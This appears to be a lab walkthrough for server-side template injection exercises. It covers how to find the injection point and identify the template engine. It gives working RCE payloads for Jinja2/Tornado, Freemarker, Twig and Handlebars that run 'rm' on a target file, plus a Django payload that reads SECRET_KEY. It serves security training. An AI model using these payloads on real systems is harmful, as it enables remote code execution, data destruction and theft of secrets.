
**Step 1 — Find the injection point**

- Log in as `wiener:peter` and browse the site. Look for:
    - URL parameters or query strings reflected in the page (e.g. `?message=`, `?name=`)
    - A "preferred name" or display name setting in your account
    - A blog/template editor function
- Send the reflected value to Burp Repeater and test with:

```
{{7*7}}   
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

💡 If `49` appears in the response, you have SSTI. If you get a verbose error, read it — it usually names the engine.

---

**Step 2 — Identify the template engine**

| Injection point                 | How to trigger an error                     | Engine revealed                    |
| ------------------------------- | ------------------------------------------- | ---------------------------------- |
| URL parameter reflected in page | Set value to a random string like `abc${{[` | Error message names the engine     |
| Preferred name / display name   | Set to random string, post a comment        | Error appears in comment rendering |
| Blog template editor            | Replace an expression with `${{<%[%'"}}%\`  | Error message names the engine     |

| What you see                         | Template engine      |
| ------------------------------------ | -------------------- |
| `49` from `{{7*7}}`                  | Jinja2 or Twig       |
| `49` from `${7*7}`                   | Freemarker or Smarty |
| `49` from `<%= 7*7 %>`               | ERB (Ruby)           |
| Tornado/Python error                 | Tornado              |
| Django error or `settings` reference | Django               |
| Handlebars error                     | Handlebars (Node.js) |

---

**Step 3 — Jump to the matching lab solve**

---

**If URL param reflected + Tornado/Jinja2-style error → Basic SSTI**

- Confirm with `{{7*7}}` → `49` in response
- Use this payload to delete the file:

```python
  {{cycler.__init__.__globals__.os.popen('rm /home/carlos/morale.txt').read()}}
```

- Send → lab solved ✅

---

**If preferred name setting exists + error on comment post → Basic SSTI (code context)**

- In Burp, find the `POST` request that sets the preferred name
- Change the name value to a random string → post a comment → confirm template engine error (Tornado)
- In the preferred name POST request, set the value to:


```python
  user.name}}{%25+import+os+%25}{{os.system('rm /home/carlos/morale.txt')}}
```
* Post a comment to trigger execution → lab solved ✅

---

**If blog template editor exists + error reveals engine → SSTI using documentation**
* Open the template editor, replace an expression with a random value → read the error to identify the engine
* Find the RCE payload for that engine on HackTricks or PayloadsAllTheThings
* For **Freemarker**:
```
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}
```
* For **Twig**:
```
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
````

- Paste payload into the template → preview/save → lab solved ✅

---

**If URL param reflected + verbose error names an unknown engine → Unknown language with documented exploit**

- Send the parameter to Burp Intruder, fuzz with the identification payloads above
- Read the verbose error — it will name the engine (likely **Handlebars**)
- Find a public exploit — for Handlebars use:

```javascript
  {{#with "s" as |string|}}
    {{#with "e"}}
      {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
          {{this.pop}}
          {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
          {{this.pop}}
          {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
              {{this}}
            {{/with}}
          {{/each}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
```
* URL encode and send → lab solved ✅

---

**If blog template editor + Django error → SSTI with information disclosure**
* Open the template editor, inject `${{<%[%'"}}%\` → confirm Django error
* Use this payload to extract the secret key:
```
  {{settings.SECRET_KEY}}
````

- Copy the key from the response and submit it via the lab banner → lab solved ✅